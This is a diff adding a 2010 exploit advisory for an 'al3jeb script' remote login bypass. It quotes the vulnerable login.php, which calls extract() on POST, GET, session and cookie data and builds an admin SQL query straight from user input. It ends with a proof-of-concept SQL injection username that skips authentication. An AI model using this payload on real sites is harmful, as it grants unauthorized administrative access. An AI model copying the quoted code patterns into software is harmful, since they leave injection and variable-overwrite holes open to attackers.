@@ -1,0 +1,46 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   |      al3jeb script Remote Login Bypass Exploit     |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Date: 19.01.2010
+[!] Remote: yes
+
+[!] Vulnerability Code [login.php] :
+
+<?
+session_start();
+extract($_POST); 
+extract($_GET); 
+extract($_SESSION); 
+extract($_COOKIE);
+?>
+<?php
+include("Connections/config.php");
+if(isset($_POST['Submit']))
+{
+ $u=$_POST["uname"];
+ $p=$_POST["pwd"];
+ $r=mysql_query("select * from admins where AdminName='$u' and AdminPass='$p'");
+ 
+if($row=mysql_fetch_array($r))
+{
+ $_SESSION['AdminName']=$u;
+ if(isset($re))
+ {
+ setcookie("username",$u,time()+3600);
+ }
+ header("location:index.php");
+ 
+}
+}
+?>
+
+
+[!] PoC: [al3jebscript]/login.php
+
+    username : ' or '1=1
+    password : cr4wl3r
